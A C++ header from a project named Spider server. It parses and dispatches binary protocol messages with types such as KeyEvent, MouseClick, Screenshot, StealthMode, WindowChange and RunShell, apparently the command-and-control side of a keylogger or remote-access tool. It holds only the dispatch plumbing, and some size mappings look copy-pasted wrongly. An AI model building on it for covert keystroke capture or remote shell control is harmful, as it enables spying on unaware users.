//
// Created by doom on 27/09/17.
//

#ifndef SPIDER_SERVER_COMMANDHANDLER_HPP
#define SPIDER_SERVER_COMMANDHANDLER_HPP

#include <unordered_map>
#include <functional>
#include <Protocol/Messages.hpp>

namespace spi
{
    class CommandHandler
    {
    public:
        proto::MessageType identifyMessage(const Buffer &buff) const
        {
            uint32_t conv = Serializer::unserializeInt(buff, 0);

            for (const proto::MessageType &cur : proto::MessageType::values()) {
                if (conv == static_cast<uint32_t>(cur)) {
                    return cur;
                }
            }
            return proto::MessageType::Unknown;
        }

        Buffer makeHeader(proto::MessageType type) const noexcept
        {
            Buffer ret;

            Serializer::serializeInt(ret, type);
            return ret;
        }

        static constexpr const size_t invalidSize = static_cast<size_t>(-1);

        size_t getSerializedSize(proto::MessageType type) const noexcept
        {
            switch (type) {
                case proto::MessageType::ReplyCode:
                    return proto::ReplyCode::SerializedSize;
                case proto::MessageType::Bye:
                    return proto::Bye::SerializedSize;
                case proto::MessageType::Hello:
                    return proto::Hello::SerializedSize;
                case proto::MessageType::KeyEvent:
                    return proto::KeyEvent::SerializedSize;
                case proto::MessageType::MouseClick:
                    return proto::MouseClick::SerializedSize;
                case proto::MessageType::MouseMove:
                    return proto::MouseMove::SerializedSize;
                case proto::MessageType::RawData:
                    return proto::RawData::SerializedSize;
                case proto::MessageType::ImageData:
                    return proto::ImageData::SerializedSize;
                case proto::MessageType::Screenshot:
                    return proto::Screenshot::SerializedSize;
                case proto::MessageType::StealthMode:
                    return proto::Screenshot::SerializedSize;
                case proto::MessageType::ActiveMode:
                    return proto::Screenshot::SerializedSize;
                case proto::MessageType::RList:
                    return proto::RList::SerializedSize;
                case proto::MessageType::RListReply:
                    return proto::RListReply::SerializedSize;
                case proto::MessageType::RStealthMode:
                    return proto::RStealthMode::SerializedSize;
                case proto::MessageType::RActiveMode:
                    return proto::RActiveMode::SerializedSize;
                case proto::MessageType::RScreenshot:
                    return proto::RScreenshot::SerializedSize;
                case proto::MessageType::WindowChange:
                    return proto::WindowChanged::SerializedSize;
                case proto::MessageType::RunShell:
                    return proto::RunShell::SerializedSize;
                case proto::MessageType::RRunShell:
                    return proto::RRunShell::SerializedSize;
                default:
                    return invalidSize;
            }
        }

        bool canHandleCommand(proto::MessageType type) const noexcept
        {
            return _cbs.find((proto::MessageType::EnumType)type) != _cbs.end();
        }

        using HandlerT = std::function<void(proto::MessageType, const Buffer &)>;
        using MessageCallbackT = std::function<void(const ILoggable &)>;

#ifdef USING_MSVC
        template <typename T>
        void onMessages(const MessageCallbackT &cb, T t) noexcept
        {
            _cbs.emplace((proto::MessageType::EnumType)t, cb);
        }
#endif

        template <typename T, typename ...Args>
        void onMessages(const MessageCallbackT &cb, T t, Args ...types) noexcept
        {
            _cbs.emplace((proto::MessageType::EnumType)t, cb);
#ifdef USING_MSVC
            onMessages(cb, types...);
#else
            (_cbs.emplace((proto::MessageType::EnumType)types, cb), ...);
#endif
        }

        void handleBinaryCommand(proto::MessageType type, const Buffer &v)
        {
            _handlers.find((proto::MessageType::EnumType)type)->second(type, v);
        }

    private:
        const std::unordered_map<proto::MessageType::EnumType, HandlerT> _handlers{
            {
                proto::MessageType::ReplyCode, [&](proto::MessageType type, const Buffer &v) {
                proto::ReplyCode rep;

                rep << v;
                _cbs[type](rep);
            }},
            {
                proto::MessageType::Bye, [&](proto::MessageType type, [[maybe_unused]] const Buffer &) {
                proto::Bye bye;

                _cbs[type](bye);
            }},
            {
                proto::MessageType::RawData, [&](proto::MessageType type, const Buffer &v) {
                proto::RawData rd;

                rd << v;
                _cbs[type](rd);
            }},
            {
                proto::MessageType::Hello, [&](proto::MessageType type, const Buffer &v) {
                proto::Hello ehlo;

                ehlo << v;
                _cbs[type](ehlo);
            }},
            {
                proto::MessageType::KeyEvent,  [&](proto::MessageType type, const Buffer &v) {
                proto::KeyEvent ke;

                ke << v;
                _cbs[type](ke);
            }},
            {
                proto::MessageType::MouseClick, [&](proto::MessageType type, const Buffer &v) {
                proto::MouseClick mc;

                mc << v;
                _cbs[type](mc);
            }},
            {
                proto::MessageType::MouseMove, [&](proto::MessageType type, const Buffer &v) {
                proto::MouseMove mm;

                mm << v;
                _cbs[type](mm);
            }},
            {
                proto::MessageType::ImageData, [&](proto::MessageType type, const Buffer &v) {
                proto::ImageData img;

                img << v;
                _cbs[type](img);
            }},
            {
                proto::MessageType::StealthMode, [&](proto::MessageType type, [[maybe_unused]] const Buffer &) {
                proto::StealthMode st;

                _cbs[type](st);
            }},
            {
                proto::MessageType::ActiveMode, [&](proto::MessageType type, [[maybe_unused]] const Buffer &) {
                proto::ActiveMode ac;

                _cbs[type](ac);
            }},
            {
                proto::MessageType::Screenshot, [&](proto::MessageType type, [[maybe_unused]] const Buffer &) {
                proto::Screenshot sc;

                _cbs[type](sc);
            }},
            {
                proto::MessageType::RList, [&](proto::MessageType type, [[maybe_unused]] const Buffer &) {
                proto::RList rl;

                _cbs[type](rl);
            }},
            {
                proto::MessageType::RListReply, [&](proto::MessageType type, const Buffer &v) {
                proto::RListReply rlr;

                rlr << v;
                _cbs[type](rlr);
            }},
            {
                proto::MessageType::RStealthMode, [&](proto::MessageType type, const Buffer &v) {
                proto::RStealthMode rep;

                rep << v;
                _cbs[type](rep);
            }},
            {
                proto::MessageType::RActiveMode, [&](proto::MessageType type, const Buffer &v) {
                proto::RActiveMode rep;

                rep << v;
                _cbs[type](rep);
            }},
            {
                proto::MessageType::RScreenshot, [&](proto::MessageType type, const Buffer &v) {
                proto::RScreenshot rep;

                rep << v;
                _cbs[type](rep);
            }},
            {
                proto::MessageType::WindowChange, [&](proto::MessageType type, const Buffer &v) {
                proto::WindowChanged rep;

                rep << v;
                _cbs[type](rep);
            }},
            {
                proto::MessageType::RunShell, [&](proto::MessageType type, const Buffer &v) {
                proto::RunShell rep;

                rep << v;
                _cbs[type](rep);
            }},
            {
                proto::MessageType::RRunShell, [&](proto::MessageType type, const Buffer &v) {
                proto::RRunShell rep;

                rep << v;
                _cbs[type](rep);
            }}
        };

        std::unordered_map<proto::MessageType::EnumType, MessageCallbackT> _cbs;
    };
}

#endif //SPIDER_SERVER_COMMANDHANDLER_HPP
